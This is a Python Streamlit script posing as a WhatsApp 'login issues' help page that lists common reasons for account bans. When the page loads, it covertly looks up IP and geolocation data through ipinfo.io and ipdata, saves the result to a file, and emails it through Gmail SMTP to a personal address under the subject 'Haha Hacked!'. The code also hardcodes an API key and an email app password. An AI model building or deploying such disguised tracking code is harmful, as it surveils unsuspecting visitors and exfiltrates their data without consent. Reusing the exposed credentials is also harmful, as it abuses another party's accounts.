import streamlit as st
import requests
import ipdata
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication




i=0  
response = requests.get('https://ipinfo.io')
ip_info = response.json()
    
    # Extract latitude and longitude
ip_addressz = ip_info.get('ip', 'N/A')
coordinates = ip_info.get('loc', '').split(',')


ipdata.api_key="b7fcdf9e5a80ea0cf59d76b39c017ad8a641a31435ea1505301e437e"
response2=ipdata.lookup(ip_addressz)

st.title("Login issues Whatsapp")

    # Get coordinates
#coordinates = get_coordinates()

    # Display coordinates
#st.subheader("Location Coordinates:")
st.write("According to WhatsApp Official claims, WhatsApp bans accounts if they believe the account activity violates their Terms of Service, for example if it involves spam, scams or if it puts WhatsApp users safety at risk.")
st.write("1. Violation of WhatsApp's Terms of Service: WhatsApp has certain guidelines and policies that users are expected to follow. If you violate these terms, such as sending spam messages, engaging in illegal activities, or using automated software (bots) to interact on WhatsApp, your account may be banned.")
st.write("2. Reports from Other Users: If multiple users report your account for abusive behavior, sending unsolicited messages, or violating WhatsApp's terms, the platform may review your account and take action, including banning your account.")
st.write("3. Using Unofficial WhatsApp Versions: If you are using an unofficial or modified version of WhatsApp that is not authorized by WhatsApp itself, your account may be banned.")
st.write("4. Technical Issues: In some cases, a ban may occur due to technical errors or glitches. These situations are relatively rare, but they can happen.")
#st.write(f"Latitude: {coordinates[0] if coordinates else 'N/A'}")
#st.write(f"Longitude: {coordinates[1] if coordinates else 'N/A'}")
#st.write(f"yeh hai tumara api{response2}")
#print(type(response2))
file_path='output/output.txt'


with open(file_path, 'w', encoding='utf-8') as file:
    file.write(str(response2))

sender_email = "gdscmcet@gmail.com"
recipient_email = "abrarsharif66@gmail.com"

# SMTP server details
smtp_server = "smtp.gmail.com"
smtp_port = 587  # Use 465 for SSL/TLS connection

# Your email account credentials
smtp_username = "gdscmcet@gmail.com"
smtp_password = "rsynrygksftroynp"



# Create a MIME object
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = recipient_email
message["Subject"] = "Haha Hacked!"

# Attach the file
with open(file_path, "rb") as file:
    attachment = MIMEApplication(file.read(), _subtype="txt")
    attachment.add_header('Content-Disposition', 'attachment', filename=file_path)
    message.attach(attachment)

# Connect to the SMTP server
with smtplib.SMTP(smtp_server, smtp_port) as server:
    # Start the TLS connection (if using 587 port)
    server.starttls()
    
    # Login to the email account
    server.login(smtp_username, smtp_password)
    
    
    while i==0:
     server.sendmail(sender_email, recipient_email, message.as_string())
     print("Email sent successfully!")
     i=i+1

print("last line")

